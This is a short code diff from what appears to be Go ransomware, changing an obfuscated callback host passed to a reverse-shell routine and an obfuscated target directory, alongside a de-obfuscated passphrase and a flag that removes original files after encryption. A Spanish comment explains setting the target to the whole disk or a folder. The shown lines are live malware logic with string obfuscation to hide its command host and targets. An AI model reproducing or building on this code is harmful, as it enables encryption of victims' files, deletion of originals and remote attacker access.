@@ -273,7 +273,7 @@ func reverse(host string) {
 }
 func main() {
 
-	host := "NUJ4MkBvND5yPkh6PEl>"
+	host := "NUlzMkF3PD5yMkF2OEp5PUh6"
 	host = desofuscarTexto(host)
 
 	for true {
@@ -286,7 +286,7 @@ func main() {
 	}
 
 	//cambiar valor para que sea disco entero o a partir de una carpeta
-	Dir := "M2W{[YK{M3SicnlwWX6qcHWwcj:neX6lZX2mcoSwdz:uZXy4ZYKmM4CzeXWjZR>>"
+	Dir := "R{pwWYOmdoNwenKwfIW{[YJ>"
 	Dir = desofuscarTexto(Dir)
 	passphrase = desofuscarTexto(passphrase)
 	var removeOriginal bool = true
